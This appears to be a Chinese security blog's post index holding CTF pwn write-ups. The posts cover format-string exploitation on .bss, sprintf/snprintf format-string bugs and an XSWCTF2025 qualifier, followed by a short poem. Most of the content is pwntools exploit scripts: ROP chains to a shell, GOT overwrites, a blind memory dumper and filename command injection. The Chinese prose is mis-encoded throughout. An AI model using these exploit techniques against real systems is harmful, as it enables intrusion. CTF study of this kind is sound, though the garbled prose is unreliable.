0x1a7ea4 ret=0x401016 ogg1=libcbase+0xddf43 ogg2=libcbase+0xfb06a p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;input content:\u0026#39;) pay2=b\u0026#39;a\u0026#39;*(0x110-4)+p32(1)+p64(0)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys) print(hex(libcbase)) print(hex(binsh)) print(hex(sys)) #gdb.attach(p) p.send(pay2) p.interactive() AAAAæ–‡ä»¶è¯»å–ç³»ç»Ÿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 void *__fastcall cat(void *a1) { char dest[8]; // [rsp+10h] [rbp-40h] BYREF __int64 v3; // [rsp+18h] [rbp-38h] __int64 v4; // [rsp+20h] [rbp-30h] __int64 v5; // [rsp+28h] [rbp-28h] __int64 v6; // [rsp+30h] [rbp-20h] __int64 v7; // [rsp+38h] [rbp-18h] __int16 v8; // [rsp+40h] [rbp-10h] *(_QWORD *)dest = 544498019LL; v3 = 0LL; v4 = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0; strcat(dest, file); system(dest); return 0LL; } void __noreturn vuln() { pthread_t newthread; // [rsp+8h] [rbp-8h] BYREF puts(\u0026amp;s); puts(\u0026#34;è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œæœ‰ä»¥ä¸‹æ–‡ä»¶â€”â€”\u0026#34;); system(\u0026#34;ls\u0026#34;); while ( 1 ) { puts(\u0026#34;æ‰€ä»¥ä½ æƒ³çŸ¥é“å“ªä¸ªæ–‡ä»¶çš„å†…å®¹å‘¢~ğŸ˜:\u0026#34;); __isoc99_scanf(\u0026amp;aS, file); if ( !strcmp(file, v1) ) puts(\u0026#34;æŠ±æ­‰ï¼Œå°±æ˜¯ä¸ç»™ä½ çœ‹è¿™ä¸ªæ–‡ä»¶å‘¢~~~~~~~~~~\u0026#34;); else pthread_create(\u0026amp;newthread, 0LL, cat, 0LL); } } å®¡è¯»æºç  å¦‚æœæ–‡ä»¶åä¸ä¸ºflagï¼Œcatå‡½æ•°ä¼šæŠŠæ–‡ä»¶åæ‹¼æ¥åˆ°deatåç„¶åæ‰§è¡Œï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆsystem(dest+å‘½ä»¤ä¹Ÿèƒ½æ‰§è¡Œä½†æ˜¯ç¡®å®å¯ä»¥ï¼ˆ æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥;ï¼‹å‘½ä»¤è¿›è¡Œå¤šæ¡å‘½ä»¤æ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,60786) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;:\u0026#39;) sys=0x4010b0 binsh=0x004020cd #pay=b\u0026#39;a\u0026#39;*0x40+p64(sys) pay=b\u0026#39;cat /flag\u0026#39; p.sendline(pay) p.interactive() nofile fmtç›²æ‰“ï¼Œä»ç½‘ä¸Šæœäº†ä¸€ä¸‹éœ€è¦å…ˆdumpæ–‡ä»¶å†…å®¹ï¼Œæ¨¡ä»¿äº†ä¸€ä¸ªè„šæœ¬å¦‚ä¸‹ï¼Œä»0x40000å¼€å§‹æ³„éœ²\nä½†æ˜¯æ³„éœ²çš„elfæ–‡ä»¶ä¸å®Œæ•´ï¼Œäºæ˜¯åˆä¸Šç½‘æœ å‘ç°\nè¿™æ ·è®¾ç½®çš„è¯å¯ä»¥æ‰“å¼€æ–‡ä»¶\nè¯»æ±‡ç¼–å‘ç°name=y0u_kn0w_c6c?çš„æ—¶å€™è·å¾—shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import os import sys import time from pwn import * from ctypes import * import binascii context.os = \u0026#39;linux\u0026#39; context.log_level = \u0026#34;debug\u0026#34; x64_32 = 1 if x64_32: context.arch = \u0026#39;amd64\u0026#39; else: context.arch = \u0026#39;i386\u0026#39; # å¢åŠ è¶…æ—¶è®¾ç½®ï¼Œé˜²æ­¢æ— é™ç­‰å¾… p = remote(\u0026#39;192.168.248.1\u0026#39;, 58731, timeout=5) begin = 0x400000 bin_data = b\u0026#39;\u0026#39; def leak(addr): \u0026#34;\u0026#34;\u0026#34; å°è¯•æ³„éœ²æŒ‡å®šåœ°å€çš„æ•°æ®ã€‚ å¦‚æœæˆåŠŸï¼Œè¿”å›æ³„éœ²çš„æ•°æ®ï¼ˆä¸å«\u0026#39;dump\u0026#39;ï¼‰ã€‚ å¦‚æœå¤±è´¥ï¼ˆè¶…æ—¶æˆ–è¿æ¥å…³é—­ï¼‰ï¼Œè¿”å› Noneã€‚ \u0026#34;\u0026#34;\u0026#34; try: pl = b\u0026#34;%7$sdump\u0026#34; + p64(addr) p.sendafter(b\u0026#39;Please enter your answer\\n\u0026#39;, pl) data = p.recvuntil(b\u0026#39;dump\u0026#39;, drop=True) return data except (pwnlib.exception.PwnlibTimeoutError, EOFError): return None try: while True: print(f\u0026#34;[*] Trying to leak address: 0x{begin:016x}\u0026#34;) data = leak(begin) if data is None: # å¦‚æœ leak è¿”å› Noneï¼Œè¯´æ˜å·²ç»æ²¡æœ‰æ•°æ®å¯ä»¥è¯»å–äº† print(\u0026#34;[!] No more data received. Exiting loop.\u0026#34;) break if not data: # å¦‚æœè¿”å›ç©ºå­—èŠ‚ä¸² b\u0026#39;\u0026#39; # è¿™é€šå¸¸æ„å‘³ç€æ³„éœ²çš„å°±æ˜¯ç©ºæ•°æ® bin_data += b\u0026#39;\\x00\u0026#39; begin += 1 else: bin_data += data begin += len(data) except Exception as e: print(f\u0026#34;[!] An error occurred: {e}\u0026#34;) finally: print(f\u0026#39;[+] Dump finished. Total length: {len(bin_data)} bytes.\u0026#39;) with open(\u0026#39;dump_bin\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(bin_data) # å°è¯•å…³é—­è¿æ¥ try: p.close() except: pass from pwn import * p = remote(\u0026#39;192.168.248.1\u0026#39;, 58731) p.recvuntil(b\u0026#39;Please enter your answer\u0026#39;) p.send(b\u0026#39;y0u_kn0w_c6c?\u0026#39;) p.interactive() ","date":"2025-12-06T23:34:28+08:00","image":"http://localhost:1313/image/XSWCTF_2.jpg","permalink":"http://localhost:1313/p/xswctf2025%E5%88%9D%E8%B5%9Bpwn-wp/","title":"XSWCTF2025åˆèµ›Pwn wp"},{"content":"ç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šï¼Œæ— æ³•ç›´æ¥å°†æƒ³è¦æ”¹å†™çš„åœ°å€æŒ‡é’ˆæ”¾ç½®åœ¨æ ˆä¸Šï¼Œä¹Ÿå°±æ²¡åŠæ³•å®ç°ä»»æ„åœ°å€å†™ã€‚é‚£ä¹ˆå°±è¦æƒ³åŠæ³•å°†æƒ³æ”¹å†™çš„åœ°å€æŒ‡é’ˆæ”¾åˆ°æ ˆä¸Š\n%x$n å†™åœ°å€æ—¶æ˜¯å°†æ­¤å¤„æ•°æ®ä½œä¸ºæŒ‡é’ˆï¼Œæ”¹å†™çš„æ˜¯è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹\nA\u0026ndash;\u0026gt; B\u0026ndash;\u0026gt; C\u0026ndash;\u0026gt; å‡è®¾Açš„åç§»ä¸ºxï¼Œ%x$nä¼šå°†Bä½œä¸ºæŒ‡é’ˆï¼Œæ”¹å†™å…¶æŒ‡å‘çš„å†…å®¹C\nå¦‚æœæˆ‘ä»¬æƒ³ä¿®æ”¹printfçš„gotè¡¨ï¼Œé¦–å…ˆéœ€è¦å¦‚ä¸‹ç»“æ„\nD\u0026ndash;\u0026gt; printf@got printfçœŸå®åœ°å€ æ ˆä¸Šæ²¡æœ‰è¿™ç§ç»“æ„ï¼Œæˆ‘ä»¬æ‰¾ç›¸ä¼¼åœ°å€ç„¶åä¿®æ”¹ä½å­—èŠ‚ä»è€Œå‘æ ˆä¸Šå†™å…¥got\nprintf_gotåœ°å€ä¸º0x404028\nè¿™ä¸ªå°±å¾ˆåƒ\nï¼ˆè¿™ä¸ªå›¾å’Œå…¶ä»–å›¾ä¸æ˜¯åœ¨åŒä¸€æ¬¡è¿è¡Œï¼‰\nåˆ©ç”¨è¿™ä¸ªä¸‰è¿æŒ‡é’ˆç»“æ„ï¼Œå°†ä¿®æ”¹ä½äºŒå­—èŠ‚æˆä¸ºä¸Šé¢çš„\nä¿®æ”¹å®Œæ¯•åå¦‚ä¸Š ï¼Œå‡ºç°äº†ï¼Œå¯ä»¥ä¿®æ”¹0x40136fä½äºŒå­—èŠ‚ä½¿å…¶æˆä¸ºprintf@got\nå‡ºç°äº†D\u0026ndash;\u0026gt;printf@got\u0026ndash;\u0026gt;printfçœŸå®åœ°å€ çš„ç»“æ„ï¼Œä¿®æ”¹printfçœŸå®åœ°å€çš„ä½å››å­—èŠ‚ä½¿å…¶æˆä¸ºsystemçœŸå®åœ°å€\nä¾‹é¢˜moectf2025_fmt_S ä¸Šé¢çš„è®²è§£å°±æ˜¯ä»¥è¿™ä¸ªé¢˜ä¸ºä¾‹çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __fastcall main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); puts(\u0026#34;You\u0026#39;re walking down the road when a monster appear.\u0026#34;); for ( i = 1; i \u0026lt;= 3 \u0026amp;\u0026amp; !flag; ++i ) talk(); if ( (unsigned __int64)atk \u0026lt;= 0337522 ) puts(\u0026#34;You\u0026#39;ve been eaten by the monster.\u0026#34;); else he(); return 0; } 1 2 3 4 5 6 7 8 9 10 size_t talk() { puts(\u0026#34;You start talking to him...\u0026#34;); *(_DWORD *)\u0026amp;flag ^= 1u; read(0, fmt, 0x20uLL); printf(fmt); puts(\u0026#34;?\u0026#34;); puts(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;); return my_read(\u0026amp;atk, 8uLL); } 1 2 3 4 5 size_t __fastcall my_read(_BYTE *a1, size_t a2) { a1[read(0, a1, a2)] = 0; return strlen(a1); } 1 2 3 4 5 6 7 8 9 10 11 unsigned __int64 he() { char command[6]; // [rsp+2h] [rbp-Eh] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); qmemcpy(command, \u0026#34;a_flag\u0026#34;, sizeof(command)); puts(\u0026#34;The monster is defeated, and you obtain: flag?\u0026#34;); system(command); return v2 - __readfsqword(0x28u); } expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 from pwn import * context(log_level=\u0026#34;debug\u0026#34;,arch=\u0026#34;amd64\u0026#34;) p=process(\u0026#39;./pwn\u0026#39;) #p=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,26001) #p=remote(\u0026#39;192.168.40.1\u0026#39;,51743) #gdb.attach(p,\u0026#39;b *0x4011D6\u0026#39;) #gdb.attach(p) #p=remote(\u0026#39;113.45.176.209\u0026#39;,9998) #p=remote(\u0026#39;1.95.36.136\u0026#39;,2102) elf = ELF(\u0026#34;./pwn\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) printf_got=0x404028 p.recvuntil(b\u0026#39;You start talking to him...\u0026#39;) p.sendline(b\u0026#39;%8$paaaa%13$p\u0026#39;) p.recvuntil(b\u0026#39;0x\u0026#39;) stack = int(p.recv(12), 16) p.recvuntil(b\u0026#39;aaaa0x\u0026#39;) libcbase = int(p.recv(12), 16)- 0x29d90 system=libcbase+libc.sym[\u0026#39;system\u0026#39;] print(hex(stack)) print(hex(libcbase)) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) #change i stack1 = stack - 0x4 a = stack1 \u0026amp; 0xffff payload = b\u0026#39;%\u0026#39; + str(a).encode() + b\u0026#39;c%6$hn\u0026#39; p.sendline(payload) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) p.recvuntil(\u0026#34;You start talking to him...\u0026#34;) p.sendline(b\u0026#39;%47$hn\u0026#39;) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) stack2=stack+0x18 b=stack2 \u0026amp; 0xffff pay2=b\u0026#39;%\u0026#39;+str(b).encode()+b\u0026#39;c%34$hn\u0026#39; p.sendline(pay2) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) #change i stack1 = stack - 0x4 a = stack1 \u0026amp; 0xffff payload = b\u0026#39;%\u0026#39; + str(a).encode() + b\u0026#39;c%6$hn\u0026#39; p.sendline(payload) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) p.recvuntil(b\u0026#39;You start talking to him...\u0026#39;) p.sendline(b\u0026#39;%47$hn\u0026#39;) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) c = printf_got \u0026amp; 0xffff pay3=b\u0026#39;%\u0026#39;+str(c).encode()+b\u0026#39;c%49$hn\u0026#39; gdb.attach(p) p.sendline(pay3) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) d = system \u0026amp; 0xffffffff pay4 = b\u0026#39;%\u0026#39; + str(d).encode() + b\u0026#39;c%15$n\u0026#39; p.sendline(pay4) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) p.sendline(b\u0026#39;sh\u0026#39;) print(\u0026#34;elf.got[\u0026#39;printf\u0026#39;] =\u0026#34;, hex(elf.got[\u0026#34;printf\u0026#34;])) p.interactive() ç”±äºå¾ªç¯æ¬¡æ•°ä¸å¤Ÿ æ‰€ä»¥æ¯æ‰§è¡Œä¸€æ¬¡æ“ä½œéœ€è¦ä¿®æ”¹iä¸º0é‡ç½®å¾ªç¯æ¬¡æ•° ä¸çŸ¥é“ä¸ºä»€ä¹ˆflag=1äº†è¿˜èƒ½å¾ªç¯\nè¿˜æœ‰ä¸€ä¸ªæ–¹æ³• expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * p=process(\u0026#39;./pwn\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(\u0026#39;You start talking to him...\u0026#39;) strlen_got=0x404008 p.sendline(b\u0026#39;%4210696c%6$lln\u0026#39;) p.recvuntil(b\u0026#39;You enraged the monster-prepare for battle!\u0026#39;) p.send(b\u0026#39;a\u0026#39;*8) p.recvuntil(\u0026#39;You start talking to him...\u0026#39;) sys_plt=0x4010e0 p.sendline(b\u0026#39;%4198624c%47$lln\u0026#39;) p.recvuntil(b\u0026#39;You enraged the monster-prepare for battle!\u0026#39;) p.send(b\u0026#39;/bin/sh\\x00\u0026#39;) p.interactive() åˆ©ç”¨ä¸‰è¿æŒ‡é’ˆæŠŠstrlen_gotå†™å…¥æ ˆä¸­,ç„¶åä¿®æ”¹strlen@gotä¸­å†…å®¹ä¸ºsystemçš„pltè¡¨\n","date":"2025-09-10T23:34:28+08:00","image":"http://localhost:1313/image/bssfmt.jpg","permalink":"http://localhost:1313/p/bss%E6%AE%B5%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","title":"bssæ®µä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"},{"content":"å‡½æ•°åŸå‹ 1 int sprintf(char *str, const char *format, ...); str:ç›®æ ‡å­—ç¬¦æ•°ç»„ï¼Œç”¨äºå‚¨å­˜æ ¼å¼åŒ–åçš„ç»“æœ\nformat:æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒåŒ…å«æ™®é€šå­—ç¬¦å’Œæ ¼å¼ç¬¦ï¼Œå¦‚a=%d\n\u0026hellip;:å¯å˜å‚æ•°ï¼Œå¯¹åº”æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„æ ¼å¼ç¬¦ï¼Œç±»å‹éœ€ä¸æ ¼å¼ç¬¦åŒ¹é…ã€‚å¦‚ è‹¥å‚æ•°formatä¸ºa=%dåˆ™\u0026hellip;åº”ä¸ºintç±»å‹çš„æ•´æ•°\nè¿”å›å€¼æ˜¯å‘strä¸­è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°\n1 int s[n]printf(char *str, size_t size, const char *format, ...) æ¯”sprintf å¤šäº†ä¸€ä¸ªsize_tå‚æ•°ï¼Œç”¨äºé™åˆ¶å¯å†™å…¥å­—ç¬¦æ•°\ndemoï¼ˆè¿™ä¸ªå‡½æ•°çš„æ­£å¸¸ä½¿ç”¨æ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char buf[200]; int num = 123; float f = 3.14159; char str[] = \u0026#34;hello\u0026#34;; int arr[] = {1, 2, 3}; // 1. æ ¼å¼åŒ–æ•´æ•°ã€å­—ç¬¦ä¸²ã€æµ®ç‚¹æ•° int len1 = sprintf(buf, \u0026#34;æ•´æ•°: %d, å­—ç¬¦ä¸²: %s, æµ®ç‚¹æ•°: %.2f\u0026#34;, num, str, f); printf(\u0026#34;ç»“æœ1: %s\\n\u0026#34;, buf); printf(\u0026#34;å†™å…¥å­—ç¬¦æ•°: %d (éªŒè¯: %zu)\\n\\n\u0026#34;, len1, strlen(buf)); // ä¸å« \\0 // 2. æ ¼å¼åŒ–åå…­è¿›åˆ¶ã€åœ°å€ int len2 = sprintf(buf, \u0026#34;åå…­è¿›åˆ¶: 0x%x, æ•°ç»„åœ°å€: %p\u0026#34;, num, arr); printf(\u0026#34;ç»“æœ2: %s\\n\u0026#34;, buf); printf(\u0026#34;å†™å…¥å­—ç¬¦æ•°: %d (éªŒè¯: %zu)\\n\\n\u0026#34;, len2, strlen(buf)); // 3. æ‹¼æ¥å¤šä¸ªæ•°æ® int len3 = sprintf(buf, \u0026#34;ç»¼åˆ: num=%d, str=%s, f=%.1f, arr@%p\u0026#34;, num, str, f, arr); printf(\u0026#34;ç»“æœ3: %s\\n\u0026#34;, buf); printf(\u0026#34;å†™å…¥å­—ç¬¦æ•°: %d (éªŒè¯: %zu)\\n\u0026#34;, len3, strlen(buf)); return 0; } æ¼æ´åŸç† æ”»å‡»è€…é€šè¿‡æº¢å‡ºç­‰æ‰‹æ®µå¯ä¿®æ”¹formatå‚æ•°ï¼Œå®Œæ•´ä»»æ„åœ°å€è¯»å†™\nPS:snprintfæ˜¯æŠŠæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€è®°ä¸‹æ¥ï¼Œæ¯æ¬¡è¦å¤„ç†ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œå…ˆä»åœ°å€å¤„å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åå†æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å¤„ç†å­—ç¬¦\ndemo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void backdoor(){ system(\u0026#34;/bin/sh\u0026#34;); return; } int main(){ char buf1[0x100]; char buf2[0x20]; char buf3[0x20]=\u0026#34;%s\\x00\u0026#34;; memset(buf1,0,0x100); puts(\u0026#34;input your data\u0026#34;); read(0,buf1,0x1000); sprintf(buf2,buf3,buf1); printf(\u0026#34;your input is %s\u0026#34;,buf2); memset(buf1,0,0x100); puts(\u0026#34;input your data again\u0026#34;); read(0,buf1,0x1000); sprintf(buf2,buf3,buf1); printf(\u0026#34;your input is %s\u0026#34;,buf2); return 0; } å…ˆåˆ©ç”¨sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæº¢å‡ºbuf2ä»è€Œä¿®æ”¹buf3(sptintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°)ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ä»»æ„åœ°å€è¯»æ¥æ³„éœ²canaryï¼Œç„¶ååˆ©ç”¨read(0,buf1,0x1000) re2text.expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * p=process(\u0026#39;./sprintf\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;input your data\u0026#39;) pay1=b\u0026#39;a\u0026#39;*32+b\u0026#39;bb%46$p\u0026#39; #0x92 is offest 150 p.sendline(pay1) #gdb.attach(p) p.recvuntil(b\u0026#39;0x\u0026#39;) canary=int(p.recv(16),16) print(hex(canary)) p.recvuntil(b\u0026#39;input your data again\u0026#39;) shell=0x4011f6 ret=0x40120F pay2=b\u0026#39;\\x00\u0026#39;*(0x108)+p64(canary)+p64(0)+p64(ret)+p64(shell) p.sendline(pay2) #gdb.attach(p) p.interactive() è¿™ä¸ªdemoå†™çš„ä¸å¤ªåˆé€‚ï¼Œä¿®æ”¹è¿”å›åœ°å€çš„æ—¶å€™ç”¨çš„å¹¶ä¸æ˜¯sprintfçš„æ¼æ´\nå¯ä»¥å†çœ‹ä¸‹ä¸‹é¢çš„ä¾‹é¢˜\næ”»é˜²ä¸–ç•ŒEasyPwn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+10h] [rbp-20h] int v5; // [rsp+14h] [rbp-1Ch] void *buf; // [rsp+18h] [rbp-18h] char nptr[8]; // [rsp+20h] [rbp-10h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); for ( i = 0; i \u0026lt;= 11; ++i ) { write(1, \u0026#34;Input Your Code:\\n\u0026#34;, 0x11uLL); __isoc99_scanf(\u0026#34;%4s\u0026#34;, nptr); v5 = atoi(nptr); if ( v5 == 1 ) { vuln(); } else { if ( v5 != 2 ) return 0LL; buf = malloc(0x100uLL); write(1, \u0026#34;Input Your Name:\\n\u0026#34;, 0x11uLL); read(0, buf, 0x100uLL); printf(\u0026#34;OK!I Know Your Name :%sNow!\u0026#34;, (const char *)buf); free(buf); } } return 0LL; } unsigned __int64 vuln() { char s[1024]; // [rsp+10h] [rbp-BF0h] BYREF char v2[1000]; // [rsp+410h] [rbp-7F0h] BYREF char v3[1024]; // [rsp+7F8h] [rbp-408h] BYREF unsigned __int64 v4; // [rsp+BF8h] [rbp-8h] v4 = __readfsqword(0x28u); memset(s, 0, sizeof(s)); memset(v3, 0, 8uLL); memset(v2, 0, 0x7E8uLL); strcpy(v3, \u0026#34;%s\u0026#34;); puts(\u0026#34;Welcome To WHCTF2017:\u0026#34;); read(0, s, 0x438uLL); snprintf(v2, 0x7D0uLL, v3, s); printf(\u0026#34;Your Input Is :%s\\n\u0026#34;, v2); return __readfsqword(0x28u) ^ v4; } read(0, s, 0x438uLL);é•¿åº¦ä¸å¤Ÿropä½†vul()å‡½æ•°çš„snprintfå‡½æ•°å¯æº¢å‡ºv3ï¼Œå¯ä»¥åˆ©ç”¨fmtä»»æ„åœ°å€è¯»æ³„éœ²libcå’Œpieåœ°å€\néšåä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹freegotè¡¨ä¸ºsystemåœ°å€(å¯ä»¥ä½¿ç”¨bssæ®µä¸Šfmtçš„æ–¹æ³•)\næ³¨æ„ç”±äºå»¶è¿Ÿç»‘å®šæœºåˆ¶æˆ‘ä»¬éœ€è¦å…ˆè°ƒç”¨ä¸€æ¬¡freeå®Œæˆç»‘å®šï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 from pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p=process(\u0026#39;./pwn1\u0026#39;) libc=ELF(\u0026#39;/home/baota/æ¡Œé¢/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\u0026#39;) elf=ELF(\u0026#39;./pwn1\u0026#39;) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Input Your Name:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) #free got p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) pay1=b\u0026#39;a\u0026#39;*1000+b\u0026#39;bb%397$p\u0026#39; p.sendline(pay1) #0x10b is offest 400 p.recvuntil(b\u0026#39;0x\u0026#39;) libcbase=int(p.recv(12),16)-0x20840 print(hex(libcbase)) #gdb.attach(p) sys=libcbase+libc.symbols[\u0026#39;system\u0026#39;] p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) pay2=b\u0026#39;a\u0026#39;*1000+b\u0026#39;bb%396$p\u0026#39; p.sendline(pay2) p.recvuntil(b\u0026#39;0x\u0026#39;) addr=int(p.recv(12),16) pie=addr-0xda0 print(hex(addr)) print(hex(pie)) free_got = pie + elf.got[\u0026#39;free\u0026#39;] print(hex(free_got)) print(hex(sys)) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) #$360$p a=(sys \u0026amp; 0xffff)-1000-0x16 gdb.attach(p) pay3=b\u0026#39;a\u0026#39;*1000+(b\u0026#39;bb%\u0026#39;+str(a).encode() + b\u0026#39;c%133$hn\u0026#39;).ljust(16,b\u0026#39;a\u0026#39;)+p64(free_got) p.sendline(pay3) b= ((sys\u0026gt;\u0026gt;16) \u0026amp; 0xffff)-1000 - 0x16 pay4 = b\u0026#39;a\u0026#39; * 1000 + (b\u0026#39;bb%\u0026#39;+str(b).encode()+b\u0026#39;c%133$hn\u0026#39;).ljust(16, b\u0026#39;a\u0026#39;)+p64(free_got+2) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) p.sendline(pay4) #gdb.attach(p) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Input Your Name:\u0026#39;) p.sendline(b\u0026#39;/bin/sh\\x00\u0026#39;) #gdb.attach(p) p.interactive() ","date":"2025-09-10T23:34:28+08:00","image":"http://localhost:1313/image/fuguang.jpg","permalink":"http://localhost:1313/p/snprintf%E5%87%BD%E6%95%B0fmt%E6%BC%8F%E6%B4%9E/","title":"s[n]printfå‡½æ•°fmtæ¼æ´"},{"content":" è¿·å¤±çš„æ«è·Œè·Œæ’æ’ é’æ¶©çš„è“å¤©ä¹Ÿè¢«æ‰°ä¹±äº†æ¨¡æ · æ˜æ˜æ®‹é˜³ï¼Œä¸¾ç›®æ¯é»„ æ»¡ç¬”è¸Œèº‡éš¾åˆ»æ˜”æ—¥çš„æ¿€æ˜‚ å²æœˆè£¹æŒŸç€æˆ‘ç•™ä¸‹æ— é—»ç¯‡ç«  åŒ†åŒ†å¿™å¿™ï¼Œå½·å½·å¾¨å¾¨ æ¸è¡Œæ¸è¿œçš„å›å¿†åªæ˜¯æ€å¿µçš„æƒ…æ„¿ä¸€å¢\nç—…æ ‘å‰å¤´ä¸‡æœ¨æ˜¥å…‰ ç¦»ä¹¡çš„ç§‹æ«ç»ˆå½’ä¸åœ¨æ¼‚æ³Šæµæµª å›°å€¦çš„é»„å¤©äº¦èƒ½å¤è‹ ç† ç† çº¢æ—¥ï¼Œæ³¼æ´’è¾‰ç…Œ\nç»æƒ…çš„æ–‡å­—ç‹¬è‡ªè¿›å–å‘ä¸Š èˆä¸‹æˆ‘ä¸€äººå“å‘³ç”Ÿå‘½çš„æ²§æ¡‘ æ™ƒæ™ƒè¡è¡ï¼Œè¸‰è¸‰è·„è·„ 